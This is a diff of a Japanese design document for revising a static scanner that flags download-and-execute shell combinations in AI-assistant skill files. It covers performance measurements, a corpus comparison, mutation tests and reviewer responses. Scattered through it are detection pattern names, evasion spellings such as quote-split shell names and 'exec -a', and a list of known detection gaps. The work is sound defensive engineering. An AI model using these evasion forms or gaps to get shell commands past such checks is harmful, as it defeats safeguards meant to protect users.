+取得: 2026-08-26T22:41Z 台（本ワーカーのプロトタイプでの `wc -l`。実装 PR では本番3ファイルに対し
+同じ diff を適用した上で再実測する）。
 
----
+| ファイル | 変更前 | 変更後 | 残余（800行上限まで） |
+|---|---|---|---|
+| `skill_vuln_shell.py` | 340 | **365**（+25） | 435 |
+| `skill_vuln_scan.py` | 721 | **721（無変更）** | 79 |
+| `skill_vuln_flow.py` | 141 | **141（無変更）** | 659 |
 
-## 5. 陰性試験と陽性対照（rev2: pytest 化を実装条件へ）
-
-### 5.1 実行済み変異（設計段階の証拠。**実装 PR では全件を pytest の failure-producing test へ翻訳する**＝G5）
-
-rev1 の M1〜M6（10 変異・全 RED・03:55Z〜04:03Z・再現 `proto566/mutation_battery.py`）に加え、巡4 対応:
-
-| # | 変異/fixture | 対応 |
-|---|---|---|
-| M4' | **dedup 実装そのものの変異**（rev1 M4 は推論代用と自認）。tacchi が実変異で RED を確認済み。実装 PR の陰性試験に「unit-dedup 無効化で2件」を追加（scan 側）＋**flow dedup 無効化で matrix #10 が2件になる**変異（rev2 新設） | tacchi Should / codex Q6 採用 |
-| M7 | `\|\|` 境界の分岐無効化 → matrix #4 fixture（HIT 実測済み 06:21Z）が赤化 | codex Q6-1 採用（rev1 では fixture 不在で緑残だった） |
-| M8 | plain subshell `( )` の depth 追跡を外す → `(a; b)` が `["(a","b)"]` に誤分割される fixture で赤化 | codex Q6-2 採用 |
-| M9 | flow の `_exec_file_regexes` 単一ソース共有を旧文法に戻す → matrix #9（`b'a'sh`）が赤化 | rev2 修正の検査経路 |
-| oracle 再定義 | M5 の backtick/`$()`「分割しないこと」を正とする試験は、**入れ子文脈内 combo の検出回避を固定する側面を持つ**（codex Q6 指摘は正しい）。rev2 ではこれらを「①トップレベル限定の**既知限界の固定**」と再定義し、matrix #12 の MISS固定テストと**必ず対で**管理する（片方だけでは意味が逆転する）。入れ子文脈の検出強化は別 issue（§10） | codex Q6 採用 |
-
-harness の欠陥（print のみ・non-zero exit なし）は自認し、G5 で pytest 化を blocking にした。
-
-### 5.2 陽性対照
-
-matrix #18〜#20 ＋ `gh api … | base64 -d > f.txt`（GREEN 実測済み）＋既存 FP 対照テスト全件（G6）。rev2 回帰: 6ケース＋陽性対照5種を rev2 プロトで再実測し全て期待どおり（06:21Z）。
-
-### 5.3 探索した入力クラス
-
-§1.1 matrix が正典（rev1 §5.3 の列挙を matrix に統合）。matrix 外の新クラス発見時は G1 のルールで行追加。
+分割計画は不要（3ファイルとも500行の分割検討ラインにも達しない）。
 
 ---
 
-## 6. 偽陽性の実測（rev2 再突合）
+## 5. 性能（G5）
 
-rev1 突合（03:55:16Z）: findings 6・flow 157 とも全フィールド不変・増減0・dedup 違反0・scan_errors=[]・evaluated=True 両側。
-**rev2 再突合**（§3.9/§3.10 適用後・実行 06:22Z〜・スクリプト全文と結果は `proto566/corpus_rev2.out` に保存）: 結果は本文書末尾の「rev2 再突合結果」に転記（実行中に本文書を改訂したため、完了後に転記した値が正）。期待値: 全フィールド不変（`_exec_file_regexes` の綴り拡張は quote 分割綴りという実コーパスに現れない筈のクラスのみ広げ、dedup は同一キー重複のみ畳むため）。**増減が出た場合は G2 の3分類を全件実施**。
+### 5.1 実コーパス walltime（本ワーカー実測）
 
----
-
-## 7. 性能（E）
-
-- **頭の裁定1（2026-08-26）: 性能 +92% は blocking にしない。** 頭の裏取り（本ワーカーも 2026-08-26T06:20Z に再実行して確認）:
-  `grep -rn "scan_skills" scripts hooks`（test 除く）→ 呼び出し元は **`scripts/lib/audit/sections_skill_vuln.py:33` の1箇所のみ**。hook からは呼ばれない＝セッション開始・対話をブロックしない。人が診断コマンドを明示的に叩いたときだけ走る。
-- **codex Q1 の関連事実（採用しないが事実として併記・自分で裏取り済み 06:20Z）**: `skills/evolve/scripts/evolve/phases_diagnose.py:254`（`run_audit` 同期実行）・同 `:277`（`collect_observability`）・`scripts/lib/fleet/audit_runner.py:156`（fleet audit の既定 `timeout: float = 10.0`）は実在する。いずれも**人が明示起動する診断経路**であり裁定1の判断を変えないが、fleet 経由では timeout 10s により audit が `timeout` status になる可能性がある。**この情報は #570 に添付し、cap／timeout 協調の設計材料とする**。
-- **#570（backtracking 根治）は #566 のマージ条件にしない**（裁定2）。「本変更固有の回帰解消をマージ条件に」という codex Q1 の残部も採用しない（同裁定。検出穴を塞ぐ方が先）。
-- 実測（同一入力クラス before/after・03:57:34Z）: 絶対パス2000seg 2.544→2.590s（不変）／**相対パス2000seg 1.359→3.095s（2.3倍・B2 拡張の新規悪化）**／plain 0.005→0.012s。実コーパス walltime 70.2→135.0s（+92%・04:03:43Z）。tacchi が walltime 2.04x を独立再現。
-- **④(h)→G8 の緩和は裁定によるものであることを G8 に明記した**（tacchi Should 採用）。
-- 打ち切り上限（cap）は本 PR に入れない（rev1 の理由3点を維持）。cap と「検査不能の surface」設計は #570 側で fleet timeout 事実と併せて行う。
-
----
-
-## 8. リスクと未実測
-
-- rev2 の `_exec_file_regexes` 変更の実コーパス影響: **不変を確認済み**（§6 rev2 再突合・06:22Z・増減0）。
-- `exec -a sh realcmd` の過剰検出リスク（rev1 リスク2・陽性対照へ追加予定）。
-- 表示層の同一行 pair は **codex が確認済み（`sections_skill_vuln.py:102` で 12→12 を正常描画・sort 決定論）**。rev1 の「未確認」を削除し、同一行表示の回帰テスト1件を G1 に含める（codex Q3-6 Should 採用）。
-- 実装と プロトの最終差分はゼロ検証（G2 再実行・機械 diff）で吸収。
-
----
-
-## 9. 巡4 指摘の個別判定（沈黙で消さない）
-
-### tacchi
-
-| 指摘 | 判定 |
-|---|---|
-| [Must-A] prose 非対称 | **採用（裁定3方式）**: ③に対象外を明記・matrix #14 で MISS固定＋pipe 型 HIT の非対称もテスト固定（G1） |
-| [Should] `\|&` | **別 issue**（裁定4・matrix #11） |
-| [Should] M4 実変異 | **採用**: §5.1 M4'（実装 PR の陰性試験に追加） |
-| [Should] ④(h) 緩め明記 | **採用**: G8 に裁定による緩和である旨を明記 |
-| [Nit] `if True:` 残骸 | 実装で除去 |
-
-### codex（Must 23 件。M04/M09 は同一族のため1行に統合して 23 行）
-
-| # | 指摘 | 判定 |
-|---|---|---|
-| 1 | Q1: 性能+92%は blocking／④(h)は round 0 逆転 | **採用しない**（頭の裁定1。裏取り転記 §7。④(h) の「緩めた事実の明記」だけ採用=G8） |
-| 2 | Q1: #566 自身の回帰解消・増加次数測定・surface テストをマージ条件に | **採用しない**（裁定1・2。#570 へ材料添付） |
-| 3 | Q3-1: `$()` 内 combo 未解消 | **別 issue**（①をトップレベル限定に明示縮小・matrix #12 で MISS固定） |
-| 4 | Q3-4/Q4-5: 実行主体の単一ソース不成立（`b'a'sh`） | **採用して直した**（§3.10・HIT 実測 06:21Z・matrix #9） |
-| 5 | Q3-5: prose 非対称 | **採用（裁定3方式）**（matrix #14） |
-| 6 | Q4-1: case 分岐またぎ FP | **採用しない**（過剰検出側=安全側に倒す既存方針。完全 parser は対象外。ただし **FP であることを matrix #13 で固定しテストで刻む**＝挙動が変わったら気づく） |
-| 7 | Q4-2: blockquote 内 fence | **別 issue**（既存穴・本設計の導入物でない。`skill_vuln_scan.py:453` 自分で確認済み） |
-| 8 | Q4-3: 継続行 quirk で結合不発 | **別 issue**（既存穴 `skill_vuln_shell.py:205`。splitter は quirk 非継承・matrix #16） |
-| 9 | Q4-9: flow 重複 | **採用して直した**（§3.9・1件固定を実測 06:21Z） |
-| 10 | Q4-10: FlowFinding 一意性・決定論 | **採用して直した**（§3.9 + G4 で合成入力にも Counter assert） |
-| 11 | Q4-11: `\|&`（+subshell 1unit MISS） | **別 issue**（裁定4・matrix #11/#12） |
-| 12 | Q4 追加: availability surface（長大行・fleet 10s） | **採用しない**（裁定1・2。事実は裏取りの上 #570 へ添付・§7） |
-| 13 | Q5①: ①が機械 blocking で守られていない | **採用して直した**（①のスコープ明示化＋G1 matrix 方式） |
-| 14 | Q5②: 信頼境界の過小評価（静的実行文脈・availability） | **採用して直した**（②書き直し: 脅威に数えた上で残存を明示固定） |
-| 15 | Q5③: 対象外が本変更の回帰・境界関数が扱う構文を免責 | **採用して直した**（③の全項目に matrix/別 issue の対応行・completion matrix に残存固定） |
-| 16 | Q5④: (a)(d)(e)(f)(h) の抜け道 | **採用して直した**（④全面書き直し=G1〜G8。(d)=合成入力 assert、(f)=pytest 化、(h)=裁定明記） |
-| 17 | Q5⑤: 検証手順が1対1・再現可能でない | **採用して直した**（⑤: スクリプト全文保存＋pytest 翻訳を blocking に） |
-| 18 | Q6: M4 が実変異でない | **採用して直した**（M4'。tacchi の実変異 RED 確認も記録） |
-| 19 | Q6: harness に assert/non-zero exit がない | **採用して直した**（G5） |
-| 20 | Q6: M5 oracle の逆転（回避の固定化） | **採用して直した**（§5.1 oracle 再定義・matrix #12 と対で管理） |
-| 21 | Q6-1: `\|\|` 変異が緑残 | **採用して直した**（matrix #4 fixture・HIT 実測・M7） |
-| 22 | Q6-2: subshell depth 変異が緑残 | **採用して直した**（M8 fixture 追加） |
-| 23 | Q2 Should: 実装とプロトの機械 diff／同一 harness 再実行 | **採用**（G2・§8。Must でないが対応を明記） |
-
----
-
-## 10. 別 issue へ落とすもの（頭が起票）
-
-1. **`|&` の separator/regex 非対応**（matrix #11・既存穴・裁定4）
-2. **入れ子実行文脈（`$()`・backtick・subshell）内の combo 検出**（matrix #12。①のトップレベル限定の外。splitter の再帰化 or 入れ子文脈の別スキャンを設計する）
-3. **blockquote 内 fenced code の fence 認識**（matrix #15・既存穴 `skill_vuln_scan.py:453`）
-4. **`is_shell_continuation` の double-quote `)` quirk による論理行結合不発**（matrix #16・既存穴 `skill_vuln_shell.py:205`）
-5. **`memory_guard.scan_text` の入力正規化**（matrix #21・既存の別境界）
-6. **#570（既存）へ追記**: fleet audit timeout 10s の事実・cap/検査不能 surface の設計・相対パスクラスの 2.3 倍悪化データ（§7）
-7. **動的展開（`$SHELL`・alias・関数・変数間接）**: 残存リスクとして記録（静的検査の原理的限界・②）
-
-heredoc pipeline（matrix #17）は #555 契約の既存テストが固定済みのため新規起票なし（既知例として matrix に固定）。
-
----
-
-## rev2 再突合結果（§6 の転記・verbatim。取得 2026-08-26T06:22:14Z〜・再現 `proto566/corpus_rev2.out` にスクリプト同梱）
+再現: `scan_skills(Path.home() / ".claude")` を `before/`（本番無変更コピー）・`after/`（§3 パッチ適用済み
+コピー）それぞれに対して直接呼び出し、`time.monotonic()` で計測。対象コーパスは 2026-08-26 時点の
+`~/.claude/skills` 配下 1351 ファイル（同一マシン・同一取得セッション。ファイル数は環境依存で
+再現時に変わりうる）。
 
 ```
-before: 1351 [] True 6 157
-after : 1351 [] True 6 157
-（F-/F+/W-/W+ の差分行なし = findings 6・flow 157 とも全フィールド不変・増減0）
-dupF: {}   dupW: {}
+=== paired before/after run, 2026-08-26T22:37:37Z ===
+BEFORE walltime=62.246s scanned=1351 findings=6 flows=157
+AFTER  walltime=68.888s scanned=1351 findings=6 flows=157
+2026-08-26T22:39:48Z
 ```
 
-→ rev2 の2修正（flow dedup・`_exec_file_regexes` 単一ソース化）後も実コーパスは完全不変。G2/G3/G4 を rev2 プロトで充足。§8 の「未確定」は解消。
+**+10.7%**（62.2s → 68.9s）。§3.3 のスコープ限定を行わず `_COMMAND_PATH` を全 `_static_command`
+呼び出し共通で拡張した場合は **+66%**（62.1s → 103.2s、取得 2026-08-26T22:32:48Z・22:34:24Z台）に
+悪化することをアブレーションで確認済み（scratchpad `isolate_slow.py` / 個別 walltime 計測ログに
+再現コマンド保存）。§3.2 の設計（B2 を shell 実行主体語のみへ限定）はこの実測に基づく。
+
+### 5.2 呼出元の再確認（頭の先行裁定の継承）
+
+```
+$ grep -rn "scan_skills" scripts hooks --include="*.py" | grep -v "/tests/"
+scripts/lib/skill_vuln_scan.py:625:def scan_skills(root: Path) -> SkillVulnReport:
+scripts/lib/audit/sections_skill_vuln.py:33:        return skill_vuln_scan.scan_skills(proj)
+```
+
+取得: 2026-08-26T22:39:56Z（本ワーカーが独立に再実行して確認）。呼出元は
+`sections_skill_vuln.py:33` の1箇所のみで、hook からは呼ばれない（対話をブロックしない）。
+先行裁定（rev2・頭の裁定1）「性能悪化は本 issue のマージ条件にしない」をそのまま継承する。
+**#570（`SHELL_EXEC_SUBJECT` の O(n²) backtracking 根治）は本 PR のマージ条件にしない**。
+
+### 5.3 O(n²) を悪化させないことの確認
+
+長大セグメント入力（2000セグメント）に対する regex-level 実測（取得 2026-08-26T22:41:34Z /
+比較対象 before は 22:41:45Z）:
+
+```
+              before      after（§3 パッチ）
+abs2000（絶対パス・既存）  1.873s      2.593s（+38%）
+rel2000（相対パス・B2対象） 1.892s(MISS)  2.612s（+38%・新規 HIT）
+```
+
+絶対パス側も一律 +38% になっているのは `_SHELL_COMMAND` の alternation 数が1つ増えたことによる
+定数倍のコストで、次数（オーダー）自体は変えていない（2000セグメント入力でも数秒で完走し
+`#570` が扱う「打ち切り上限（cap）」設計を必須にしない）。rev2 で報告された「相対パス2000segが
+2.3倍悪化」（1.359→3.095s）は `_COMMAND_PATH` を全 `_static_command` 呼び出しへ広げた設計の値であり、
+§3.3 のスコープ限定によりこの増加率は解消されている。
+
+---
+
+## 6. 実コーパス突合（G2）
+
+取得: 2026-08-26T22:37:30Z台（`run_corpus.py` で `before`/`after` それぞれの
+`(rel_path, line, pattern_id, category, severity, snippet)` タプル list と
+`(rel_path, producer_line, consumer_line, pattern_id, var)` タプル list を出力しファイル diff）。
+
+```
+before: scanned=1351 errors=[] evaluated=True findings=6 flows=157
+after : scanned=1351 errors=[] evaluated=True findings=6 flows=157
+diff before_findings.txt after_findings.txt  → 差分なし（IDENTICAL）
+diff before_flows.txt    after_flows.txt     → 差分なし（IDENTICAL）
+```
+
+**findings・flow_findings とも全フィールド不変・増減0**。新規 FP は0件（G2 充足）。
+
+---
+
+## 7. 陰性試験・陽性対照（G4）
+
+`verify-checks-by-breaking.md` の4クラス（①要素を消す ②語は残して意味を壊す ③分散・入替
+④検査を無効化）各1件を pytest で実行し、全て赤化を確認した（本ワーカーが実際に mutation を
+適用して実行。全文は scratchpad `test_mutation_566cut.py` + 4変異ディレクトリに保存済み）。
+
+| # | クラス | 変異内容 | 対象 | 結果 |
+|---|---|---|---|---|
+| M1 | ①要素を消す | `(?:[^\n\|]*\|)+` → `[^\n\|]*\|`（`+` を除去） | A3 | **RED**: `test_a3_multistage_pipe_hits` failed。他7件 green |
+| M2 | ②語は残して意味を壊す | `_OPTION_WITH_OPERAND` の `-a` を `-z` に変更（構造は残し対象フラグを外す） | B1 | **RED**: `test_b1_exec_dash_a_operand_hits` failed。他7件 green |
+| M3 | ③分散・入替 | `_COMMAND_PATH_RELATIVE` を `_SHELL_COMMAND` から `_WRAPPER_COMMAND` へ付け替え（スコープの入替） | B2 | **RED**: `test_b2_relative_multisegment_hits` failed。陽性対照 `test_b2_control_absolute_path_still_hits` は green（付け替えが絶対パス既存機能を壊していないことも確認） |
+| M4 | ④検査を無効化 | `curl_pipe_sh` パターンをカタログから削除 | 全体 | **RED**: A3/B1/B2 + 単一段/wrapper無し/絶対パスの制御群まで6件 failed（検査全体が無効化されたことを広く検出） |
+
+陽性対照（変異なしの baseline）: 8件 all green（`echo` literal 非検出・単一段パイプ既存機能・
+wrapper operand なし既存機能・絶対パス既存機能・`download_and_run` パターン在存の回帰カナリアを含む）。
+
+実行ログ（要旨。全文は取得コマンドとともに scratchpad 保存）:
+
+```
+=== after (baseline) ===        8 passed
+=== mut_m1_a3_revert ===        1 failed (test_a3_multistage_pipe_hits), 7 passed
+=== mut_m2_b1_wrongflag ===     1 failed (test_b1_exec_dash_a_operand_hits), 7 passed
+=== mut_m3_b2_scope_swap ===    1 failed (test_b2_relative_multisegment_hits), 7 passed
+=== mut_m4_disable_curlpipe === 6 failed, 2 passed
+```
+
+実装 PR ではこれらを `scripts/lib/tests/test_skill_vuln_shell.py`（または新規テストファイル）へ
+そのまま移植する。
+
+---
+
+## 8. リスクと未解決
+
+- **B1 のスコープ（`-a` 限定）が狭すぎる可能性**: `env` コマンドは実際には `-a` オプションを
+  持たない（GNU env の argv0 rename は無い）。`-a` は主に `exec`（bash builtin）向けだが、
+  regex 側では wrapper 名を区別せず一律に許可している。過剰検出方向（安全側）であり、
+  「`env -a foo sh` が HIT する」は誤検出ではあるが combo（curl 経由の shell 実行）自体は
+  本物であるため実害は小さいと判断した。将来 wrapper 別にオプション文法を分離する余地は残る。
+- **B2 のスコープ限定（§3.3）は shell 実行主体語のみ**: `sudo bin/sh` のような
+  「wrapper が PATH 相対パスで綴られ、かつその後の shell が絶対/相対パス無しで綴られる」複合ケースは
+  引き続き検出対象外（`_WRAPPER_COMMAND` 側は `_COMMAND_PATH` のみのため）。実コーパスに出現せず
+  matrix にも追加していないため、対象外として明示し新規 issue は起票しない（発見されたら
+  matrix に行を追加する・G1）。
+- rev2 で発見された既存穴（`|&`・入れ子実行文脈内 combo・blockquote 内 fence・継続行 quirk・
+  `memory_guard.scan_text` 正規化）は本 rev3 でも**すべて対象外のまま**。切り出し先は
+  rev2 §10 のリストをそのまま `#571` へ引き継ぐ（頭が起票済みかを確認）。
+
+---
+
+## 9. 参照
+
+- 実測スクリプト・変異ディレクトリ一式: scratchpad `proto566cut/`
+  （`before/` `after/` `mut_m1_a3_revert/` `mut_m2_b1_wrongflag/` `mut_m3_b2_scope_swap/`
+  `mut_m4_disable_curlpipe/` `run_corpus.py` `probe_targets.py` `test_mutation_566cut.py`
+  `isolate_slow.py`）。実装 PR 着手時に同一手順で本番3ファイルへ再実行し、値の再現を確認すること。
+- 前身 rev2（A1〜A4+B1〜B3 全件版・巡4まで）: `git log` で本ファイルの旧版参照、または
+  PR/issue #566 のコメント履歴。
